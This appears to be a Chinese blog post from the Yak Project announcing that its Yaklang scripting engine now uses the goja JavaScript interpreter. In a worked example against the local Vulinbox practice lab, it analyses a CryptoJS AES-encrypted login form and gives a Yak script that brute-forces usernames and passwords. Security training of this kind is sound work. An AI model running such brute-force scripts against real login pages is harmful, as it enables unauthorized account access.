#  上新！更强大的JS引擎：goja   
原创 Lonelone  Yak Project   2024-04-25 17:30  
  
![](/articles/wechat2md-57d4b38fb5fac67b077017855ed50c43.gif)  
  
![](/articles/wechat2md-01c1c684e6a259dea97dd828d8543ec7.gif)  
  
  
## **前言**  

一直以来，Yaklang引擎使用 robertkrimen/otto （**以下简称otto**）作为 JavaScript 解释器以执行一些 JavaScript 代码。然而，最近用户提出的许多新需求在使用 otto 这个第三方库时遇到了一些问题，其主要原因是因为 otto 的语法树解析实现存在一些问题，因此在遇到一些执行压缩过后的 JavaScript 第三方依赖（如常见的CryptoJS）时会出现解析错误。  
  
为了解决这个问题，也为了完善用户的体验，我们决定使用 **dop251/goja** （**以下简称为 goja** ）这个第三方库来代替 otto 这个库，让 otto 这个库光荣退休。  
> otto: 我不是退役了 我只是没人要  
  
## **为什么选择 goja**  
  
选择 **goja**的原因有很多，列出主要的几点：  
- 完整的 ECMAScript 5.1 实现（甚至有不完整的ECMAScript 6.0 实现）  
  
- 通过了大部分的 tc39 tests，这是官方的 ECMAScript 一致性测试套件  
  
- 比 otto 的平均速度快6~7倍  
  
  
  
## **几乎一致性的API**  
  
对于yaklang语言的用户来说，此次升级是几乎无感知的，在升级的同时确保了 80% 的API无变动，但由于底层实现不尽相同，因此可能会存在某些不常用的函数（如js.ASTWalk，js.GetSTType）以及结构体方法（如Value）会存在某些差异，对此库用户的影响控制在合适的范围内。  
  
  
## **全新的内置第三方JavaScript依赖API**  
 
此次升级的一个重要点在于为了解决使用某些常用 **JavaScript**第三方依赖（如上文提到的 **CryptoJS**）的问题。通过新的API，我们可以快速地使用这些 **JavaScript**第三方依赖，而省略编译的过程（初次编译之后会进行缓存，之后不再需要进行编译）。  
  
一个简单的使用**CryptoJS V3**的例子如下：  
```
_, value = js.Run(`
    CryptoJS.HmacSHA256("Message", "secret").toString();
 `, js.libCryptoJSV3())~
 println(value.String())
```  
## **实战案例**    
以 **Yakit** 自带的 **Vulinbox**靶场其中的高级前端加解密与验签实战 - CryptoJS.AES(CBC) 前端加密登陆表单为例，讲解一下如何使用升级后的 js 库。如何安装与启动 **Vulinbox**靶场这里不再赘述。靶场详细参考此文[【文末抽奖】Yak叫你来打靶了](http://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247512304&idx=1&sn=dc1f3b3119309c495f1bd438b6b8b059&chksm=c2d1cc54f5a645420b1a075484b3f444d4b29736b7aa32265c877ba1a45620fdf04fcd9d7cda&scene=21#wechat_redirect)  
   
网站页面如下：  
  
![](/articles/wechat2md-82dafeff9bdc72ca6c35d609d98398fd.png)  
  
打开网站后，我们查看其页面源代码，观察前端是如何对数据进行加密的，主要核心代码如下：  
```
var iv = CryptoJS.lib.WordArray.random(128/8);

function generateKey() {
    return  CryptoJS.enc.Utf8.parse("1234123412341234")  // 十六位十六进制数作为密钥
}

const key = generateKey()

// 加密方法
function Encrypt(word) {
    console.info(word);
    return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); 
}

function getData() {
    return {
        "username": document.getElementById("username").value,
        "password": document.getElementById("password").value,
    }
}

function outputObj(jsonData) {
    const word = JSON.stringify(jsonData);
    return {
        "data": Encrypt(word),
        "key": key.toString(),
        iv: iv.toString(),
    }
}

function submitJSON(event) {
    event.preventDefault();

    const url = "/crypto/js/lib/aes/cbc/handler";
    let jsonData = getData();
    let submitResult = JSON.stringify(outputObj(jsonData), null, 2)
    // 使用submitResult请求后台接口...
}

document.getElementById("json-form").addEventListener("submit", submitJSON)
```  
  
简单分析知道，其最后请求的请求体是 **submitResult**这个变量，这是一段JSON，包含了 **data**, **key**, **iv**三个属性，其中 key 是固定的，iv 是随机生成的。虽然 iv 是随机生成的，但是并不影响我们进行爆破，我们可以同样生成一个新的iv或者使用页面的iv也可。  
  
最后我们提炼出以下代码，基本上直接复制上述的js代码稍作修改即可使用：   
```
// 注意这里我们不能直接复制 key 的赋值代码，这是因为 ECMAScript 5.1 不支持 const 关键字
key = CryptoJS.enc.Utf8.parse("1234123412341234");
iv = CryptoJS.lib.WordArray.random(128/8);

function Encrypt(word) {
    console.info(word);
    return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); 
}

function getData(username, password) {
    return {
        "username": username, 
        "password": password,
    }
}

function outputObj(jsonData) {
    const word = JSON.stringify(jsonData);
    return {
        "data": Encrypt(word),
        "key": key.toString(),
        iv: iv.toString(),
    }
}

jsonData = getData("username", "password"); // 这里填写爆破的用户名和密码
submitResult = JSON.stringify(outputObj(jsonData), null, 2);// 最后发送的请求体

```  
  
最终我们编写了一段简单的 Yak 代码，用于对此题进行爆破：  
```
for user in ["user", "admin"] {
    for pass in ["pass", "123456"] {
        vm, _ = js.Run(`
        key = CryptoJS.enc.Utf8.parse("1234123412341234");
        iv = CryptoJS.lib.WordArray.random(128/8);

        function Encrypt(word) {
            return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); 
        }

        function getData(username, password) {
            return {
                "username": username, 
                "password": password,
            }
        }

        function outputObj(jsonData) {
            const word = JSON.stringify(jsonData);
            return {
                "data": Encrypt(word),
                "key": key.toString(),
                iv: iv.toString(),
            }
        }

        jsonData = getData(%#v, %#v);
        submitResult = JSON.stringify(outputObj(jsonData), null, 2);` % [user, pass], js.libCryptoJSV3())~

        body = vm.Get("submitResult").String()

        rsp, _ = poc.Post("http://127.0.0.1:8787/crypto/js/lib/aes/cbc/handler", poc.replaceBody([]byte(body), false))~
        println(string(rsp.RawPacket))
    }
}
```  
  
![](/articles/wechat2md-290a7e3105ce58757542a21da3db5eb2.png)  
  
响应中显示解密前端内容成功，这证明我们已经成功将请求体进行加密，可以用于爆破，后续只需要在for循环填入需要爆破的用户名密码即可。  
  
  
**END**  
  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
https://yaklang.com/docs/intro/Yakit   
视频教程：  
https://space.bilibili.com/437503777Github  
下载地址：  
https://github.com/yaklang/yakitYakit  
官网下载地址：  
https://yaklang.com/Yakit  
安装文档：  
https://yaklang.com/products/download_and_install  
Yakit使用文档：  
https://yaklang.com/products/intro/  
常见问题速查：  
https://yaklang.com/products/FAQ  
  
![](/articles/wechat2md-85062b6e6c63b9d9d17d1e2a5ca2ec01.other)  
长按识别添加工作人员
开启Yakit进阶之旅  
![](/articles/wechat2md-14665f86963c7c123b43378ebc55bb0f.other)
  
  
